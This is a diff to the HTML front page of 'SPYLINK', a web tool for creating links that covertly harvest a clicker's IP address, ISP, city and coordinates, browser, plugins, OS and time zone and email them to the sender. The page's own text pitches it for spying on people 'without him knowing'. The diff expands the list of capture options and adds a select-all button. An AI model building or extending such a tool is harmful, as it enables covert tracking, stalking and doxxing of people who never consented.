@@ -5,6 +5,11 @@
   <meta charset="UTF-8">
   <title>SPYLINK</title>
   <link rel="stylesheet" href="/static/style.css">
+  <link
+    rel="icon"
+    href="https://images-ext-1.discordapp.net/external/QKh5TGTwsUF8orvpuH7ewn9LWmiy8mUStsDY7kK76rM/%3Fsize%3D240/https/cdn.discordapp.com/banners/1154855315339214918/825c92c967246f5915b0d5c4aa8275cf.webp?format=webp"
+    type="image/png"
+  />
 </head>
 <body>
   <div class="container">
@@ -12,6 +17,7 @@
     <p class="subtitle">
       You want to locate someone? You want to find someone's IP address? You would like to know what version of Windows a friend is using or his computer configuration, without him knowing? Easy! Create a spy link in 4 clicks and send it to the person you want to spy on. As soon as the person clicks the link, you will immediately and discreetly receive his private information in your mail box.
     </p>
+
     <form method="post" action="/create">
       <label>1) Redirect the spy link to the website:</label>
       <input type="text" name="target_url" placeholder="http://youtube.com" required>
@@ -25,21 +31,58 @@
       <input type="email" name="email" placeholder="you@example.com" required>
 
       <label>4) Select info to capture:</label>
-      <label><input type="checkbox" name="capture_ip" checked> IP Address</label>
-      <label><input type="checkbox" name="capture_geo" checked> Geolocation</label>
 
+      <fieldset>
+        <legend>Network information</legend>
+        <label><input type="checkbox" name="capture_ip"      /> IP address</label>
+        <label><input type="checkbox" name="capture_host"    /> Host</label>
+        <label><input type="checkbox" name="capture_provider" /> Access Provider Name</label>
+        <label><input type="checkbox" name="capture_proxy"   /> Proxy detection</label>
+      </fieldset>
+
+      <fieldset>
+        <legend>Geographical information</legend>
+        <label><input type="checkbox" name="capture_continent" /> Continent</label>
+        <label><input type="checkbox" name="capture_country"   /> Country</label>
+        <label><input type="checkbox" name="capture_region"    /> Region</label>
+        <label><input type="checkbox" name="capture_city"      /> City</label>
+        <label><input type="checkbox" name="capture_latlong"   /> Latitude/Longitude</label>
+      </fieldset>
+
+      <fieldset>
+        <legend>Browser information</legend>
+        <label><input type="checkbox" name="capture_browser"   /> Browser name and version</label>
+        <label><input type="checkbox" name="capture_cookies"   /> Cookies activated or not</label>
+        <label><input type="checkbox" name="capture_flash"     /> Flash installed + version</label>
+        <label><input type="checkbox" name="capture_java"      /> Java activated or not</label>
+        <label><input type="checkbox" name="capture_plugins"   /> Installed Plug-ins</label>
+      </fieldset>
+
+      <fieldset>
+        <legend>System information</legend>
+        <label><input type="checkbox" name="capture_os"           /> OS name and version</label>
+        <label><input type="checkbox" name="capture_resolution"   /> Screen resolution</label>
+        <label><input type="checkbox" name="capture_localtime"    /> Local date and time</label>
+        <label><input type="checkbox" name="capture_timezone"     /> Time zone</label>
+      </fieldset>
+
+      <!-- new button to select everything -->
+      <button type="button" id="selectAllOptions">Select All Options</button>
+      <!-- main submit -->
       <button type="submit">CREATE MY SPY LINK</button>
     </form>
+
     <p><a href="#">Become a Premium member right away to take advantage of all our options!</a></p>
   </div>
 
-  <!-- ─── Keep-alive ping every 10 seconds ─────────────────────────────── -->
+  <!-- keep-alive ping every 10 seconds -->
   <script>
-    setInterval(() => {
-      fetch('/ping').catch(() => {});
-    }, 10 * 1000);
-  </script>
-  <!-- ──────────────────────────────────────────────────────────────────── -->
+    setInterval(() => fetch('/ping').catch(() => {}), 10 * 1000);
 
+    // Select-all script
+    document.getElementById('selectAllOptions').addEventListener('click', () => {
+      document.querySelectorAll('input[type="checkbox"]').forEach(cb => cb.checked = true);
+    });
+  </script>
 </body>
 </html>
